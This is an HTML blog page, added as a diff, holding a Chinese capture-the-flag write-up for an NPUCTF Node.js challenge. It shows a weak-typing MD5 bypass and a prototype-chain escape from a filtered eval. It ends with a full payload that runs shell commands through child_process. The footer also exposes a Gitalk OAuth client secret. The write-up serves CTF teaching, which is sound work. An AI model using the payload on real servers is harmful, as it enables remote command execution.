@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html>
+  <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta content="yes" name="apple-mobile-web-app-capable" />
+  <meta content="black" name="apple-mobile-web-app-status-bar-style" />
+  <meta name="referrer" content="never">
+  <meta name="keywords" content="">
+  <meta name="description" content="">
+  <meta name="author" content="kveln">
+  <title>NPUCTF 验证🐎 （JS弱类型+原型链） |  </title>
+  <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
+  <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
+  <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
+  <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
+  <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+  <link rel="alternate" type="application/rss+xml" title="NPUCTF 验证🐎 （JS弱类型+原型链） |   » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
+  <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
+  <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/highlight.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/jquery.min.js"></script> -->
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+
+    <meta property="og:description" content="NPUCTF 验证🐎 （JS弱类型+原型链）"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/XxOKeal9U/"/>
+    <meta property="og:locale" content="zh-CN"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:site_name" content=" "/>
+  </head>
+  <body>
+  	<!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand" href="https://guokeya.github.io"> </a>
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+        Menu
+        <i class="fas fa-bars"></i>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/">首页</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/archives">归档</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/post/about">关于</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/tags">分类</a>
+              
+          </li>
+          
+        </ul>
+      </div>
+    </div>
+  </nav>
+  <!-- Page Header -->
+  <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
+    <div class="overlay"></div>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <div class="post-heading">
+          	<span class="tags">
+          	 
+        </span>
+            <h1>NPUCTF 验证🐎 （JS弱类型+原型链）</h1>
+            <span class="meta">
+            	Posted on
+              2020-04-22，6 min read
+            </span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Post Content -->
+  <article>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <p>题目给出了源码</p>
+<pre><code>const express = require('express');
+const bodyParser = require('body-parser');
+const cookieSession = require('cookie-session');
+
+const fs = require('fs');
+const crypto = require('crypto');
+
+const keys = require('./key.js').keys;
+
+function md5(s) {
+  return crypto.createHash('md5')
+    .update(s)
+    .digest('hex');
+}
+
+function saferEval(str) {
+  if (str.replace(/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g, '')) {
+    return null;
+  }
+  return eval(str);
+} // 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个
+
+const template = fs.readFileSync('./index.html').toString();
+function render(results) {
+  return template.replace('{{results}}', results.join('&lt;br/&gt;'));
+}
+
+const app = express();
+
+app.use(bodyParser.urlencoded({ extended: false }));
+app.use(bodyParser.json());
+
+app.use(cookieSession({
+  name: 'PHPSESSION', // 2020.3/WORKER2 嘿嘿，给👴爪⑧
+  keys
+}));
+
+Object.freeze(Object);
+Object.freeze(Math);
+
+app.post('/', function (req, res) {
+  let result = '';
+  const results = req.session.results || [];
+  const { e, first, second } = req.body;
+  if (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[0]) === md5(second+keys[0])) {
+    if (req.body.e) {
+      try {
+        result = saferEval(req.body.e) || 'Wrong Wrong Wrong!!!';
+      } catch (e) {
+        console.log(e);
+        result = 'Wrong Wrong Wrong!!!';
+      }
+      results.unshift(`${req.body.e}=${result}`);
+    }
+  } else {
+    results.unshift('Not verified!');
+  }
+  if (results.length &gt; 13) {
+    results.pop();
+  }
+  req.session.results = results;
+  res.send(render(req.session.results));
+});
+
+// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI
+app.get('/source', function (req, res) {
+  res.set('Content-Type', 'text/javascript;charset=utf-8');
+  res.send(fs.readFileSync('./index.js'));
+});
+
+app.get('/', function (req, res) {
+  res.set('Content-Type', 'text/html;charset=utf-8');
+  req.session.admin = req.session.admin || 0;
+  res.send(render(req.session.results = req.session.results || []))
+});
+
+app.listen(80, '0.0.0.0', () =&gt; {
+  console.log('Start listening')
+});
+</code></pre>
+<p>第31行。<code>app.use(bodyParser.json())</code>将请求用json解析<br>
+继续看。程序接受三个参数。e,first,second</p>
+<pre><code>first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[0]) === md5(second+keys[0])
+看到这种代码。一般就是弱类型。奈何对js不够熟悉。
+这里可以用first=1 second=[1]
+服务端得到的数据是first=1  second=[1]
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://guokeya.github.io/post-images/1587560890221.png" alt="" loading="lazy"></figure>
+<pre><code>至于MD5
+在进行比较时
+md5(&quot;1&quot;+key[0])
+md5([1]+key[0])
+会先把数组的1强制转换为字符串。也就是&quot;1&quot;
+所以md5会相同
+</code></pre>
+<p>下一关。把e放入正则中。然后带入eval执行<br>
+对格式有要求</p>
+<pre><code>/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g
+这个正则意思是。只能是Math.xxxxx。符号只能出现()+\-*&amp;|%^&lt;&gt;=,?:
+</code></pre>
+<p>由于允许()=&gt;这些字符。那么我们可以利用JS的箭头函数。来执行。</p>
+<pre><code>首先来介绍下箭头函数。其实就是匿名函数
+x =&gt; x * x
+function (x){
+    return x*x;
+}
+</code></pre>
+<p>对照着Payload一步步分析</p>
+<pre><code>(Math=&gt;(Math=Math.constructor,Math.x=Math.constructor(Math.fromCharCode(97,108,101,114,116,40,49,41))()))(Math+1)
+
+
+最外层的payload如下
+(Math=&gt;(xxxxx)())(Math+1)
+最外面的小括号。是JS的立即执行函数。否则你就只是单单定义了这个函数。
+开头的Math是箭头函数。需要接受的参数。类似于function(Math)
+然后最后括号的Math+1。就是你传入的参数
+接下来进入Math箭头函数的内部。也就是这个函数会执行什么
+
+(Math=Math.constructor,Math=Math.constructor(Math.fromCharCode(97,108,101,114,116,40,49,41))())
+可以看到。这里定义了Math。把传入的Math的constructor赋值
+具体是什么意思呢。这里是利用了JS的原型链。一开始Math并没有定义。如果我们直接传入Match。那么会是object。而payload中传入的是Math+1。此时类型就变成了object1。object对象和字符串进行拼接。那么会转换为string类型
+为了清楚。我们重写下代码
+test=Math.constructor
+返回string类型的原型。string
+test2=test.constructor
+返回string原型的原型。function
+也就是通过一个object1从原型链上获取了string和function两种类型
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://guokeya.github.io/post-images/1587561892649.png" alt="" loading="lazy"></figure>
+<pre><code>fromCharCode函数必须是在string类型上用。
+Math=Math.constructor
+#定义了string类型
+Math=Math.construtor
+#定义了function类型
+Math.constructor,Math=Math.constructor(Math.fromCharCode(97,108,101,114,116,40,49,41))()
+等同于
+function(string.fromCharCode(xxxxxxxxx)()
+</code></pre>
+<p>完整exp</p>
+<pre><code>{&quot;e&quot;:&quot;(Math=&gt;(Math=Math.constructor,Math.x=Math.constructor(Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()))(Math+1)&quot;,&quot;first&quot;:&quot;1&quot;,&quot;second&quot;:[1]}
+</code></pre>
+
+          
+          <p class="next-post">下一篇：
+            <a href="https://guokeya.github.io/post/bBSaaelaQ/">
+              <span class="post-title">
+                PyCalX 1&amp;2&rarr;
+              </span>
+            </a>
+          </p>
+        
+        <div class="comment">
+          
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<div id="gitalk-container"></div>
+<script>
+  var gitalk = new Gitalk({
+    clientID: 'c07e068ab9501a423854',
+    clientSecret: '33e8ada317c799c9a4ca5cbbb2070ff5a423903b',
+    repo: 'Message',
+    owner: 'guokeya',
+    admin: ['guokeya'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+  gitalk.render('gitalk-container')
+</script>
+
+          
+          
+        
+        </div>
+      </div>
+    </div>
+  </article>
+ <!-- Footer -->
+  <footer>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <ul class="list-inline text-center">
+            
+            
+            <li class="list-inline-item">
+              <a href="http://github.com/guokeya" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+            </li>
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+              <li class="list-inline-item">
+              <a href="https://guokeya.github.io/atom.xml" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+              </li>
+          </ul>
+          <p class="copyright text-muted">Copyright &copy;<span> </span><br><a href="https://github.com/getgridea/gridea" class="Themeinfo">Powered by Gridea<br >浙ICP备2021000950号-1</a></p>
+        </div>
+      </div>
+    </div>
+   </footer>
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/bootstrap.bundle.min.js"></script> -->
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.jsdelivr.net/gh/Alanrk/clean-cdn@1.0/scripts/clean-blog.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/clean-blog.min.js"></script> -->
+  <script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+  <style type="text/css">a.back_to_top{text-decoration:none;position:fixed;bottom:40px;right:30px;background:#f0f0f0;height:40px;width:40px;border-radius:50%;line-height:36px;font-size:18px;text-align:center;transition-duration:.5s;transition-propety:background-color;display:none}a.back_to_top span{color:#888}a.back_to_top:hover{cursor:pointer;background:#dfdfdf}a.back_to_top:hover span{color:#555}@media print,screen and(max-width:580px){.back_to_top{display:none!important}}</style>
+<a id="back_to_top" href="#" class="back_to_top">
+  <span>▲</span></a>
+<script>$(document).ready((function(_this) {
+    return function() {
+      var bt;
+      bt = $('#back_to_top');
+      if ($(document).width() > 480) {
+        $(window).scroll(function() {
+          var st;
+          st = $(window).scrollTop();
+          if (st > 30) {
+            return bt.css('display', 'block')
+          } else {
+            return bt.css('display', 'none')
+          }
+        });
+        return bt.click(function() {
+          $('body,html').animate({
+            scrollTop: 0
+          },
+          800);
+          return false
+        })
+      }
+    }
+  })(this));</script>
+  </body>
+</html>
+
